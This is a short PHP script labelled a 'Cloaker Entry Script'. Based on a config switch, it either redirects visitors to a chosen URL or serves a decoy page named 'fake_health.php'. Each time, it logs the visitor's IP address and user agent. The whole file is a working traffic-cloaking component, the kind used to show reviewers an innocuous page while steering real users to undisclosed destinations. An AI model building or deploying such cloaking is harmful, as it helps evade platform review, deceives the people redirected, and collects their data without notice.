<?php
// Cloaker Entry Script
$config = parse_ini_file(__DIR__ . '/redirect_config.ini');
$enabled = (int)$config['redirect_enabled'];
$url = $config['redirect_url'];
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$time = date('Y-m-d H:i:s');
$type = $enabled ? 'REAL' : 'BLOCKED';
file_put_contents(__DIR__ . '/logs.txt', "[$type] [$time] IP: $ip | UA: $ua\n", FILE_APPEND);
if ($enabled) {
    header('Location: ' . $url);
    exit;
} else {
    include __DIR__ . '/fake_health.php';
    exit;
}
?>